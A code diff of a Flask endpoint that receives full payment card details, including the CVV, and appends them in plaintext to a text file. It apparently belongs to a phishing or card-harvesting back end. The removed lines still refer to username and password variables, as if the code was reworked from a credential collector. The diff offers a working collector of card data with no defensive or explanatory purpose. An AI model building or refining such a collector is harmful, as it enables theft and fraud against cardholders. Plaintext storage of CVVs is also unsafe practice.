@@ -10,25 +10,29 @@ data_file = "credit_data.txt"
 
 @app.route('/submit', methods=['POST'])
 def submit_data():
-    # Get the data from the request
-   data = request.get_json()
+    try:
+        data = request.get_json()
+        print("Received data:", data)
 
+        cardnumber = data.get('cardNumber')
+        name = data.get('cardHolder')
+        month = data.get('expirationMonth')
+        year = data.get('expirationYear') 
+        expiry = f"{month}/{year}"
+        cvv = data.get('cvv')
 
-   cardnumber = data.get('cardnumber')
-   name = data.get('name')
-   expiry = data.get('expiry')
-   cvv = data.get('cvv')
+        if cardnumber and name and month and year and cvv:
+            with open(data_file, 'a') as file:
+                file.write(f"CardNumber: {cardnumber}, CardHolderName: {name}, Expiry: {expiry}, CVV: {cvv}\n")
 
+            return jsonify({"message": "Data saved successfully"}), 200
+        else:
+            print("Invalid data received.")
+            return jsonify({"message": "Invalid data. All fields are required."}), 400
 
-   if username and password:
-       # Open the file in append mode and save the username and password
-       with open(data_file, 'a') as file:
-           file.write(f"CardNumber: {cardnumber}, CardHolderName: {name}, expiry:{expiry}, cvv:{cvv}\n")
-
-
-       return jsonify({"message": "Data saved successfully"}), 200
-   else:
-       return jsonify({"message": "Invalid data"}), 400
+    except Exception as e:
+        print("Error:", str(e))
+        return jsonify({"message": "Server error"}), 500
 
 
 
